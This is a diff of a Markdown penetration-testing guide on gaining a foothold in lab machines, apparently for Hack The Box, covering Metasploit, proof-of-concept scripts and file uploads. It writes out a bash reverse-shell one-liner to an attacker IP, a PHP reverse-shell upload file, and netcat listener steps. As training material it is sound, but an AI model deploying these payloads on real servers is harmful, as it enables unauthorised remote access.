@@ -1,56 +1,16 @@
 # Foothold
 
- - [Reverse Shells](Foothold.md#reverse-shell)
- - [Common Vulnerabilities and Exposures (CVE)](Foothold.md#common-vulnerabilities-and-exposures-cve)
- - [Manual Remote Code Execution (RCE)](Foothold.md#manual-remote-code-execution)
+ - [Metasploit](Foothold.md#metasploit)
+ - [Proof of Concept Scripts](Foothold.md#proof-of-concept-scripts)
+ - [File Upload](Foothold.md#file-upload)
  
-## Reverse Shell
-By far, this is a concept that will come up the most on just about every single machine.  
-When you need something that offers command and control of a target after you've exploited it,  
-you have two options: a file/port that you connect to or you make the server connect to you.  
-Having the server connect to you is a much more reliable option.  
-
-Utilizing a reverse shell is a three step process
-
- 1. Setting up a listener on the attacking machine
-    ```
-    Command Breakdown:
-        nc: TCP/IP swiss army knife, used to read and write data across network connections
-        -n: No DNS
-        -v: Verbose
-        -l: Listen for inbound connections
-        -p 4444: Local port to open for connections
-    ```
-
-    ```console
-    user@parrot:~$ nc -nvlp 4444
-    listening on [any] 4444 ...
-    ```
-     
- 2. Executing a reverse shell on the target machine.  
-    This step can use any number of programming languages and commands.  
-    Luckily, there's a Github repository called [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)  
-    that offers a cheat sheet for such a thing. (Among many other great materials)
-    
- 3. Return to the listener and start enumerating for a better user.
-    ```console
-    user@parrot:~$ nc -nvlp 4444
-    listening on [any] 4444 ...
-    connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 33280
-    www-data@example:/var/www/html$ id
-    uid=33(www-data) gid=33(www-data) groups=33(www-data)
-    ```
-    
-## Common Vulnerabilities and Exposures (CVE)
+## Metasploit
 Since getting the service versions was a part of the reconnaissance phase, it should be taken advantage of.  
 Google the version of any services you find and see if there are any vulnerabilities.  
-If lucky, there's a Metasploit module or a pre-made script on Exploit-DB.  
-If a Metasploit module is used, you won't have to set up your own netcat listener.  
-Pre-made scripts that you can download on Exploit-DB can be different;  
-sometimes they'll drop you directly into a shell, and sometimes you have to give your own commands
+If you're lucky, there's a Metasploit module that you can use.  
 
 There's a nice [SANS cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf) to help use Metasploit though.  
-Here's an example run of a fake exploit to put the cheatsheet into perpsective.
+Here's an example run of an example exploit to put the cheatsheet into perpsective.
 ```console
 msf5 > search example
 
@@ -89,7 +49,7 @@ msf5 exploit(multi/http/example_file_upload) > run
 [*] Started reverse TCP handler on 10.10.15.1:4444
 [*] Sending stage (37543 bytes) to 10.10.10.10
 [*] Meterpreter session 1 opened (10.10.15.1:4444 -> 10.10.10.10:56052) at 2020-07-11 20:51:40 -0500
-[+] Deleted image.php
+[+] Deleted payload.php
 meterpreter > shell
 Process 3816 created.
 Channel 0 created.
@@ -97,40 +57,80 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Manual Remote Code Execution
-When it's not a well-known CVE with scripts already made for a specific vulnerability,  
-then you might just have to do it yourself. If you run out of things to look for  
-and you can't find any CVE's, then you can start going through user inputs to see  
-what you might be able to exploit. This might normally be php file uploads on easy boxes.
+## Proof of Concept Scripts
+If you find a vulnerability on a service, but there isn't a Metasploit module available,  
+you might be able to find a proof of concept (PoC) script on Github or Exploit-DB.  
+More often than not, a PoC script will only give you the ability to send commands to run, which can be slow and cumbersome to use.  
+The solution to this is setting up a reverse shell.
 
-My favorite example of this is executing php code from an uploaded image.  
-Below, i've displayed a slightly simplified version of the default php config.  
-```console
-user@parrot:~$ cat /etc/apache2/mods-available/php7.4.conf
-<FilesMatch ".+\.php$">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-# Deny access to files without filename (e.g. '.php')
-<FilesMatch "^\.php$">
-    Require all denied
-</FilesMatch>
-```
-The part of the config that keeps the website from executing images as well  
-is the ending `$` symbol in the regular expression that specifies that it should end with `.php`.  
-If a developer wanted to modify this and forgot the `$`,  
-then files like `image.php.jpg` gets treated like PHP.  
-Slightly more complex versions of this specific attack can use metadata,  
-but what most of them have in common is that you have to create a reverse shell.  
-In a file upload attack like this, you'd also have to curl the image to trigger it.
-```console
-user@parrot:~$ nc -nvlp 4444                                  ║ user@parrot:~$ curl 10.10.10.10/image.php.jpg
-listening on [any] 4444 ...                                   ║
-connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 33280    ║
-www-data@example:/var/www/html$ id                            ║
-uid=33(www-data) gid=33(www-data) groups=33(www-data)         ║
+Utilizing a reverse shell is a three step process
+
+ 1. Setting up a netcat listener on your local machine
+    ```
+    Command Breakdown:
+        nc: TCP/IP swiss army knife, used to read and write data across network connections
+        -n: No DNS
+        -v: Verbose
+        -l: Listen for inbound connections
+        -p 4444: Local port to open for connections
+    ```
+
+    ```console
+    user@parrot:~$ nc -nvlp 4444
+    listening on [any] 4444 ...
+    ```
+     
+ 2. Executing a reverse shell on the target machine by using a PoC script.  
+    This step can use any number of programming languages and commands.  
+    Luckily, there's a Github repository called [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)  
+    that offers a cheat sheet for such a thing. (Among many other great materials)
+    ```console
+    user@parrot:~$ python3 50180 http://10.10.10.10/example -c "bash -i >& /dev/tcp/10.10.15.1/4444 0>&1"  
+    Example 2.3 - Remote Command Execution
+    
+    [+] Uploading malicious .zip file: ✓
+    [+] Executing bash -i >& /dev/tcp/10.10.15.1/4444 0>&1: ✓
+    [+] Keep breaking ev3rYthiNg!!
+    ```
+    
+ 3. Return to the listener and start enumerating for a better user.
+    ```console
+    user@parrot:~$ nc -nvlp 4444
+    listening on [any] 4444 ...
+    connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 33280
+    www-data@example:/var/www/html$ id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    ```
+
+## File Upload
+If there isn't a common vulnerability to exploit, then you might want to look for a place to upload files.  
+If you do find a place to upload files, then you should try uploading a PHP reverse shell.
+
+payload.php:
+```php
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.1/4444 0>&1'");
+?>
 ```
 
-The mindset to find this sort of vulnerability is the same mindset needed to  
-find many other flavors of file upload and remote code execution attacks on HTB.  
-If there's a place for user input on easier boxes, the odds are pretty good that it's exploitable;  
-sometimes you'll have to be pretty creative with these things though.
+Once you've uploaded the reverse shell, then you can create a netcat listener and trigger the playload.
+
+ 1. Setting up a netcat listener on your local machine
+    ```console
+    user@parrot:~$ nc -nvlp 4444
+    listening on [any] 4444 ...
+    ```
+     
+ 2. With your file uploaded, you should find out where it's stored on the website and `curl` it to trigger the reverse shell.
+    ```console
+    user@parrot:~$ curl http://10.10.10.10/upload/payload.php
+    ```
+    
+ 3. Return to the listener and start enumerating for a better user.
+    ```console
+    user@parrot:~$ nc -nvlp 4444
+    listening on [any] 4444 ...
+    connect to [10.10.10.10] from (UNKNOWN) [10.10.15.1] 45812
+    www-data@example:/var/www/html$ id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    ```
